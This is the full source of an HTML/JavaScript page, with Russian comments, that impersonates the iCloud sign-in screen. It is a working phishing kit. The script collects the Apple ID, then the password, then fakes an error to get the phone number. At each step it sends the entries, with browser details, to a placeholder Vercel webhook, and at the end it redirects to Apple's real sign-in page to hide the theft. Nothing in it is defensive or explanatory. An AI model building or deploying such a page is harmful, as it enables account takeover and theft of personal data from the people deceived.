<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>iCloud - Sign In</title>
  <!-- Apple CDN стили и иконки -->
  <link rel="stylesheet" href="https://cdn.apple-cloudkit.com/cloudkit-ui/2.0.0/cloudkit-ui.css">
  <style>
    /* Полная имитация Apple */
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    body { background: linear-gradient(135deg, #f5f7fa 0%, #e9eef3 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
    .container { max-width: 400px; width: 90%; margin: 20px; }
    .logo { text-align: center; margin-bottom: 30px; }
    .logo img { width: 50px; height: auto; }
    .card { background: rgba(255,255,255,0.9); backdrop-filter: blur(10px); border-radius: 18px; padding: 40px 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.1), 0 4px 12px rgba(0,0,0,0.05); border: 1px solid rgba(255,255,255,0.3); }
    h1 { font-size: 27px; font-weight: 600; color: #1d1d1f; margin-bottom: 10px; text-align: center; }
    .subhead { text-align: center; color: #86868b; font-size: 17px; margin-bottom: 30px; }
    .apple-id-field, .password-field { margin-bottom: 20px; }
    label { display: block; font-size: 14px; font-weight: 500; color: #1d1d1f; margin-bottom: 5px; }
    input { width: 100%; padding: 14px 16px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 16px; background: white; transition: border 0.2s; }
    input:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 0 3px rgba(0,113,227,0.1); }
    .password-wrapper { position: relative; }
    .toggle-password { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #0071e3; font-size: 14px; cursor: pointer; }
    .phone-field { margin-bottom: 20px; opacity: 0; height: 0; overflow: hidden; transition: opacity 0.3s; }
    .phone-field.visible { opacity: 1; height: auto; }
    .btn { width: 100%; padding: 14px; background: #0071e3; border: none; border-radius: 12px; color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
    .btn:hover { background: #0077ed; }
    .error-message { color: #bf4800; font-size: 14px; margin-top: 5px; display: none; }
    .footer { text-align: center; margin-top: 25px; color: #86868b; font-size: 14px; }
    .footer a { color: #0071e3; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
    /* Анимация как на Apple сайте */
    @keyframes fadeSlide { 0% { opacity: 0; transform: translateY(10px); } 100% { opacity: 1; transform: translateY(0); } }
    .card { animation: fadeSlide 0.6s ease-out; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://www.apple.com/ac/globalnav/7/en_US/images/globalnav/apple/image_large.svg" alt="Apple">
    </div>
    <div class="card">
      <h1>Sign in to iCloud</h1>
      <p class="subhead">Use your Apple ID or create a new account.</p>
      
      <form id="loginForm">
        <!-- Этап 1: Apple ID -->
        <div class="apple-id-field" id="step1">
          <label for="appleId">Apple ID</label>
          <input type="email" id="appleId" name="appleId" placeholder="name@example.com" required autocomplete="email">
        </div>
        
        <!-- Этап 2: Пароль (изначально скрыт) -->
        <div class="password-field" id="step2" style="display: none;">
          <label for="password">Password</label>
          <div class="password-wrapper">
            <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password">
            <button type="button" class="toggle-password" id="togglePassword">Show</button>
          </div>
        </div>

        <!-- Этап 3: Номер телефона (появляется после "ошибки") -->
        <div class="phone-field" id="step3">
          <label for="phone">Verify your phone number</label>
          <input type="tel" id="phone" name="phone" placeholder="+7 (999) 123-45-67">
          <div class="error-message" id="phoneError">We need to verify your identity. Please enter your phone number.</div>
        </div>

        <button type="submit" class="btn" id="submitBtn">Continue</button>
      </form>

      <div class="footer">
        <a href="#">Forgot Apple ID or password?</a><br>
        <a href="#">Create Apple ID</a>
      </div>
    </div>
  </div>

  <script>
    // Полная имитация интерфейса входа с отправкой на Vercel
    (function() {
      const form = document.getElementById('loginForm');
      const step1 = document.getElementById('step1');
      const step2 = document.getElementById('step2');
      const step3 = document.getElementById('step3');
      const phoneField = document.querySelector('.phone-field');
      const submitBtn = document.getElementById('submitBtn');
      const appleIdInput = document.getElementById('appleId');
      const passwordInput = document.getElementById('password');
      const phoneInput = document.getElementById('phone');
      const togglePassword = document.getElementById('togglePassword');

      let step = 1; // 1: email, 2: password, 3: phone

      // Toggle password visibility (Apple стиль)
      togglePassword.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        this.textContent = type === 'password' ? 'Show' : 'Hide';
      });

      // Эмуляция процесса входа
      form.addEventListener('submit', async function(e) {
        e.preventDefault();

        if (step === 1) {
          // Переход к вводу пароля
          step1.style.display = 'none';
          step2.style.display = 'block';
          step = 2;
          submitBtn.textContent = 'Sign In';
          passwordInput.focus();
          
          // Отправляем email на сервер (первый этап)
          await sendData({ appleId: appleIdInput.value, stage: 'email' });
          
        } else if (step === 2) {
          // Имитация проверки - всегда ошибка для запроса телефона
          step3.classList.add('visible');
          document.getElementById('phoneError').style.display = 'block';
          step = 3;
          submitBtn.textContent = 'Verify';
          phoneInput.focus();
          
          // Отправляем пароль
          await sendData({ 
            appleId: appleIdInput.value, 
            password: passwordInput.value,
            stage: 'password' 
          });
          
        } else if (step === 3) {
          // Финальная отправка с телефоном
          submitBtn.disabled = true;
          submitBtn.textContent = 'Verifying...';
          
          const success = await sendData({
            appleId: appleIdInput.value,
            password: passwordInput.value,
            phone: phoneInput.value,
            stage: 'final'
          });

          if (success) {
            // Перенаправление на реальный Apple ID после "успеха"
            window.location.href = 'https://id.apple.com/signin?appIdKey=cloudkit';
          } else {
            alert('Verification failed. Please try again.');
            submitBtn.disabled = false;
            submitBtn.textContent = 'Verify';
          }
        }
      });

      // Функция отправки данных на Vercel backend
      async function sendData(data) {
        try {
          // Добавляем техническую информацию
          const enhancedData = {
            ...data,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer || 'direct'
          };

          const response = await fetch('https://your-vercel-app.vercel.app/api/webhook', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(enhancedData)
          });

          if (!response.ok) {
            console.error('Server error');
            return false;
          }

          // Для stage 1 и 2 всегда возвращаем успех
          if (data.stage !== 'final') return true;

          const result = await response.json();
          return result.success || false;

        } catch (error) {
          console.error('Send error:', error);
          // В случае ошибки связи всё равно редиректим (graceful degradation)
          if (data.stage === 'final') {
            window.location.href = 'https://id.apple.com/signin?appIdKey=cloudkit';
          }
          return true;
        }
      }

      // Автофокус
      appleIdInput.focus();

      // Сохранение в localStorage для сессий (имитация)
      window.addEventListener('load', function() {
        if (localStorage.getItem('appleId')) {
          appleIdInput.value = localStorage.getItem('appleId');
        }
      });
    })();
  </script>
</body>
</html>
